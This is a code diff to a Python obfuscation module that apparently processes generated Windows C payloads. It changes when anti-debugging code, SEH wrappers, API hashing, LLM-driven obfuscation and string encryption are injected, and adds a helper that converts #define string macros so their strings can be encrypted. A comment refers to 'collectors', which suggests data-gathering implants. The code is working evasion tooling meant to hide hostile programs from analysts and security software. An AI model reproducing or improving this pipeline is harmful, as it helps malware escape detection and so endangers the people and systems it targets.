@@ -40,6 +40,34 @@ def _has_chunk_guard(source: str, guard: str) -> bool:
     return guard in source
 
 
+def _expand_define_strings(source: str) -> str:
+    """Convert #define NAME "string" into static char* NAME = "string" so string
+    encryption can reach them. Only targets defines whose value is a quoted string.
+    Handles duplicate defines (from multiple chunks) by keeping only the first."""
+    lines = source.split('\n')
+    define_re = re.compile(r'^(\s*)#define\s+([A-Z_][A-Z0-9_]*)\s+"([^"]*)"')
+    replacements = {}
+    new_lines = []
+    for line in lines:
+        m = define_re.match(line)
+        if m:
+            indent, name, value = m.group(1), m.group(2), m.group(3)
+            if name in replacements:
+                new_lines.append(f'{indent}/* dup {name} removed */')
+            else:
+                replacements[name] = value
+                new_lines.append(f'{indent}static char *_{name}_v = "{value}";')
+        else:
+            new_lines.append(line)
+    source = '\n'.join(new_lines)
+    for name in replacements:
+        source = re.sub(r'\b' + name + r'\b', f'_{name}_v', source)
+        source = source.replace(f'#define _{name}_v', f'#define {name}')
+        source = source.replace(f'#ifndef _{name}_v', f'#ifndef {name}')
+        source = source.replace(f'#ifdef _{name}_v', f'#ifdef {name}')
+    return source
+
+
 def obfuscate(source: str, level: str = "heavy", llm_url: str = None) -> str:
     if level == "none":
         return source
@@ -49,7 +77,7 @@ def obfuscate(source: str, level: str = "heavy", llm_url: str = None) -> str:
     has_anti_debug = _has_chunk_guard(source, "CHUNK_ANTI_DEBUG")
     has_api_hash = _has_chunk_guard(source, "CHUNK_API_HASH")
     has_string_encrypt = _has_chunk_guard(source, "CHUNK_STRING_ENCRYPT")
-    is_chunk = "CHUNK_" in source or "emit_buffer" in source
+    is_individual_chunk = "CHUNK_" in source and "emit_buffer" not in source
 
     # 1. Sanitize includes (always)
     source = _sanitize_includes(source, os_platform="windows")
@@ -63,13 +91,13 @@ def obfuscate(source: str, level: str = "heavy", llm_url: str = None) -> str:
     if level in ("heavy", "max"):
 
         # 3. SEH wrapper — skip for chunk code (breaks argc/argv + 30s timeout kills collectors)
-        if not is_chunk:
+        if not is_individual_chunk:
             source = _inject_seh_in_main(source)
         else:
             logger.info("Skipping SEH injection (chunk-assembled code)")
 
         # 4. Anti-debug (skip if chunk already has it or is chunk code)
-        if not has_anti_debug and not is_chunk:
+        if not has_anti_debug and not is_individual_chunk:
             source = _inject_anti_debug(source)
         else:
             logger.info("Skipping anti-debug injection (chunk code or CHUNK_ANTI_DEBUG present)")
@@ -86,8 +114,12 @@ def obfuscate(source: str, level: str = "heavy", llm_url: str = None) -> str:
         model = os.environ.get("LLM_MODEL", "")
         source = _llm_obfuscate(source, url, model=model)
 
+    # Convert #define string macros to globals so string encryption can reach them
+    if not is_individual_chunk:
+        source = _expand_define_strings(source)
+
     # String encryption always last (skip if chunk already encrypts or is chunk code)
-    if not has_string_encrypt and not is_chunk:
+    if not has_string_encrypt and not is_individual_chunk:
         source = _encrypt_string_literals(source)
     else:
         logger.info("Skipping string encryption (chunk code or CHUNK_STRING_ENCRYPT present)")
